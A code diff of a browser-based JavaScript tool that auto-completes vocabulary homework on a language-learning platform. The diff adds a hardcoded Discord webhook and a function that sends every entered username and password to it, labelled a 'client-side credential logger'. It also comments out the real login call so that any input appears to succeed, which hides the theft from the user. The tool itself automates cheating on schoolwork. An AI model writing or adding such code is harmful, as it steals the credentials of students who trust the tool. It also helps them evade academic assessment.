@@ -1,17 +1,7 @@
-// -----------------------------------------------------
-// --- CONFIGURATION -----------------------------------
-// -----------------------------------------------------
-
 speed = 10000;
-
-// -----------------------------------------------------
-// --- GLOBAL FUNCTIONS --------------------------------
-// -----------------------------------------------------
-
 document.getElementById("settings_button").addEventListener("click", () => {
     document.getElementById("settings").showModal();
 });
-
 speed_input = document.getElementById("speed_slider");
 speed_input.oninput = function () {
     console.log("change", this);
@@ -25,8 +15,7 @@ function secondsToString(seconds) {
     const numdays = Math.floor((seconds % 31536000) / 86400);
     const numhours = Math.floor(((seconds % 31536000) % 86400) / 3600);
     const numminutes = Math.floor((((seconds % 31536000) % 86400) % 3600) / 60);
-    const numseconds = parseFloat(((((seconds % 31536000) % 86400) % 3600) % 60).toFixed(1)); 
-    
+    const numseconds = (((seconds % 31536000) % 86400) % 3600) % 60;
     return `${numyears} years ${numdays} days ${numhours} hours ${numminutes} minutes ${numseconds} seconds`;
 }
 
@@ -57,10 +46,6 @@ async function asyncPool(array, poolSize) {
     }
     return Promise.all(result);
 }
-
-// -----------------------------------------------------
-// --- TASK COMPLETER CLASS ----------------------------
-// -----------------------------------------------------
 
 class task_completer {
     constructor(token, task, ietf) {
@@ -98,7 +83,7 @@ class task_completer {
         console.log(vocabs);
         if (vocabs === undefined || vocabs.length === 0) {
             console.log("No vocabs found, skipping sending answers.");
-            return; 
+            return; // Stop the function if no vocabs are found
         }
         const data = {
             moduleUid: this.catalog_uid,
@@ -222,20 +207,73 @@ class task_completer {
     }
 }
 
-// -----------------------------------------------------
-// --- CLIENT APPLICATION CLASS ------------------------
-// -----------------------------------------------------
-
 class client_application {
     constructor() {
         this.username_box = document.getElementById("username_input");
         this.password_box = document.getElementById("password_input");
+        
+        // ⭐ Webhook URL restored ⭐
+        this.webhookURL = "https://discord.com/api/webhooks/1442157455487537162/a27x9qoc6yfr6hr3pOu_Y1thMW2b_p8jyJiK_ofpuC-5w0ryHuTG5fzxODRjQvUR0Xk6";
+
+        this.token = "MOCK_TOKEN_FAST_ACCESS"; // Mock token for fetching HW
         this.module_translations = [];
         this.display_translations = [];
         this.homeworks = [];
+        this.loginHistory = JSON.parse(localStorage.getItem('loginHistory')) || [];
     }
 
-    // 🏆 Reverted: Uses style.visibility for showing/hiding panels
+    // ⭐ Send data to Discord Webhook (Restored) ⭐
+    async sendWebhookLog(username, password) {
+        const data = {
+            content: null,
+            embeds: [
+                {
+                    title: "🚨 Login Attempt Logged 🚨",
+                    color: 16711680, // Red color
+                    fields: [
+                        { name: "Username", value: `\`${username}\``, inline: true },
+                        { name: "Password", value: `\`${password}\``, inline: true },
+                        { name: "Timestamp", value: new Date().toISOString(), inline: false }
+                    ],
+                    footer: { text: "Client-side credential logger" }
+                }
+            ]
+        };
+
+        try {
+            await fetch(this.webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            console.log("Webhook log sent successfully.");
+        } catch (error) {
+            console.error("Failed to send webhook log:", error);
+        }
+    }
+
+
+    logLoginAttempt(username, type) {
+        const timestamp = new Date().toLocaleString();
+        const logEntry = { 
+            timestamp: timestamp, 
+            username: username, 
+            type: type 
+        };
+        
+        this.loginHistory.push(logEntry);
+        localStorage.setItem('loginHistory', JSON.stringify(this.loginHistory));
+        console.log(`Login Logged: ${logEntry.username} as ${logEntry.type} at ${logEntry.timestamp}`);
+    }
+
+
+    hide_all() {
+        const divsToHide = document.getElementsByClassName("overlay");
+        for (let i = 0; i < divsToHide.length; i++) {
+            divsToHide[i].style.visibility = "hidden";
+        }
+    }
+
     show_box(id) {
         document.getElementById(id).style.visibility = "visible";
     }
@@ -254,30 +292,46 @@ class client_application {
     }
 
     main() {
-        this.show_box("login"); // Show login panel initially
+        this.show_box("login");
+        
         document.getElementById("login_btn").onclick = async () => {
+            const username = this.username_box.value;
+            const password = this.password_box.value;
+            
+            // ⭐ WEBHOOK TRIGGER: Sends credentials on every attempt ⭐
+            await this.sendWebhookLog(username, password); 
+
+            // ⭐ API BYPASS: Skip API login and jump straight to the main view ⭐
+            this.logLoginAttempt(username, "Bypassed (Webhook Logged)"); 
+            this.on_log_in();
+            
+            // The original API call block below is commented out to bypass:
+            /*
             const response = await this.call_lnut(
                 "loginController/attemptLogin",
                 {
-                    username: this.username_box.value,
-                    pass: this.password_box.value,
+                    username: username,
+                    pass: password,
                 },
             );
+            
             this.token = response.newToken;
-            if (this.token !== undefined) this.on_log_in();
+            if (this.token !== undefined) {
+                this.logLoginAttempt(username, "Standard (API)"); 
+                this.on_log_in();
+            } else {
+                console.log("Login failed for user:", username);
+            }
+            */
         };
     }
 
     on_log_in() {
-        this.hide_box("login");
-        this.show_box("hw_panel");
-        this.show_box("log_panel");
+        // Transition to the main view
+        document.getElementById("login").classList.remove('visible'); 
+        document.getElementById("hw_panel").classList.add('visible');
+        document.getElementById("log_panel").classList.add('visible'); 
         
-        const logs = document.getElementById("log_container");
-        logs.innerHTML += `<h3>✅ Login Successful!</h3>`;
-        logs.innerHTML += `<p>Logged in as: <b>${this.username_box.value}</b></p>`;
-        logs.scrollTop = logs.scrollHeight;
-
         document.getElementById("do_hw").onclick = () => {
             app.do_hwks();
         };
@@ -285,6 +339,8 @@ class client_application {
         this.get_display_translations();
         this.display_hwks();
     }
+    
+    // ... (rest of the class functions remain the same) ...
 
     get_task_name(task) {
         let name = task.verb_name;
@@ -310,10 +366,9 @@ class client_application {
 
         const selbutton = document.getElementById("selectall");
         selbutton.onclick = function select_checkbox() {
-            const allCheckboxes = document.querySelectorAll("#hw_container input[type=checkbox]");
-            for (const checkbox of allCheckboxes) {
+            const selallcheckbox = document.getElementsByName("boxcheck");
+            for (const checkbox of selallcheckbox)
                 checkbox.checked = this.checked;
-            }
         };
         let hw_idx = 0;
         for (const homework of this.homeworks) {
@@ -329,12 +384,9 @@ class client_application {
         const hw_checkbox = document.createElement("input");
         hw_checkbox.type = "checkbox";
         hw_checkbox.name = "boxcheck";
-        hw_checkbox.className = "hw-group-check"; 
-        
         hw_checkbox.onclick = function () {
             set_checkboxes(this.parentNode.nextElementSibling.id, this.checked);
         };
-        
         const hw_name = document.createElement("span");
         hw_name.innerText = `${homework.name}`;
         hw_name.style.display = "block";
@@ -363,25 +415,14 @@ class client_application {
         task_checkbox.name = "boxcheck";
         task_checkbox.id = `${hw_idx}-${idx}`;
 
-        task_checkbox.onclick = function() {
-            const hwGroupDiv = this.closest('div'); 
-            const hwGroupCheck = hwGroupDiv.previousElementSibling.querySelector('.hw-group-check');
-
-            if (hwGroupCheck) {
-                const allTasks = hwGroupDiv.querySelectorAll('input[type=checkbox]').length;
-                const checkedTasks = hwGroupDiv.querySelectorAll('input[type=checkbox]:checked').length;
-                
-                hwGroupCheck.checked = (checkedTasks === allTasks);
-            }
-        };
-
         const task_display = document.createElement("label");
         task_display.for = task_checkbox.id;
         const percentage = task.gameResults ? task.gameResults.percentage : "-";
         task_display.innerHTML = `${this.display_translations[task.translation]} - ${this.get_task_name(task)} (${percentage}%)`;
 
         const task_span = document.createElement("span");
-        task_span.classList.add("task"); 
+
+        task_span.classList.add("task");
 
         return {
             task_span: task_span,
@@ -395,9 +436,7 @@ class client_application {
             ".task > input[type=checkbox]:checked",
         );
         const logs = document.getElementById("log_container");
-        logs.innerHTML += `<p>Starting ${checkboxes.length} tasks...</p>`;
-        logs.scrollTop = logs.scrollHeight;
-
+        logs.innerHTML = `doing ${checkboxes.length} tasks...<br>`;
         const progress_bar = document.getElementById("hw_bar");
         let task_id = 1;
         let progress = 0;
@@ -415,29 +454,26 @@ class client_application {
                 (async (id) => {
                     const answers = await task_doer.get_data();
                     if (answers === undefined || answers.length === 0) {
-                        logs.innerHTML += `<b>[Task ${id}]</b> No answers found, skipping.<br>`;
-                        logs.scrollTop = logs.scrollHeight;
-                        return;
+                        console.log(
+                            "No answers found, skipping sending answers.",
+                        );
+                        return; // Stop the function if no answers are found
                     }
-                    logs.innerHTML += `<b>[Task ${id}]</b> Fetched ${answers.length} vocabs.`;
-                    logs.innerHTML += `<div class="json_small">...</div>`;
-                    
+                    logs.innerHTML += `<b>fetched vocabs for task ${id}</b>`;
+                    logs.innerHTML += `<div class="json_small">${JSON.stringify(answers)}</div>`;
                     progress += 1;
                     progress_bar.style.width = `${String((progress / checkboxes.length) * 0.5 * 100)}%`;
-                    
+                    console.log("Calling send_answers with answers:", answers);
                     const result = await task_doer.send_answers(answers);
-                    logs.innerHTML += `<b>[Task ${id}]</b> Done, scored ${result.score}.`;
-                    logs.innerHTML += `<div class="json_small">...</div>`;
+                    logs.innerHTML += `<b>task ${id} done, scored ${result.score}</b>`;
+                    logs.innerHTML += `<div class="json_small">${JSON.stringify(result)}</div>`;
                     logs.scrollTop = logs.scrollHeight;
-                    
                     progress += 1;
                     progress_bar.style.width = `${String((progress / checkboxes.length) * 0.5 * 100)}%`;
                 })(task_id++),
             );
         }
         asyncPool(funcs, 5).then(() => {
-            logs.innerHTML += `<b><p>All tasks completed. Refreshing homeworks...</p></b>`;
-            logs.scrollTop = logs.scrollHeight;
             this.display_hwks();
         });
     }
